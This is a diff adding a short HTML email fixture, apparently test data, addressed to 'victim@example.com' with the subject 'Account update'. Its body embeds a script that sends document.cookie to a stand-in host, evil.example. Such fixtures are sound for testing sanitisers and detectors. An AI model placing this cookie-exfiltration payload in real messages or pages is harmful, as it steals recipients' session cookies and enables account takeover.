@@ -1,0 +1,7 @@
+From: sender@example.com
+To: victim@example.com
+Subject: Account update
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>Account update.</p><script>fetch('https://evil.example/exfil?c='+document.cookie)</script></body></html>
